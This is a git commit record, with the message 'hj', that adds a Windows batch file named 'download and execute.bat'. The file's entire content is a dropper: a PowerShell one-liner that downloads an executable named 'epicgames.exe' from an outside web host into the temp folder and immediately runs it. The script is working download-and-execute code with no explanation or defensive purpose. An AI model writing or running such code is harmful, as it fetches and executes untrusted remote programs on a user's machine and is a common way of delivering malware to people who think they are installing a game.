0fbce54422752f9561275f8fc85c2a2fe8b3d48c
Finn B <finnegolfer@gmail.com>
2018-08-14 19:29:00 -0700

    hj

---
+++ download and execute.bat
@@ -0,0 +1,8 @@
+
+
+set files=,'http://mogiant.azurewebsites.net/epicgames.exe'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+pause
+
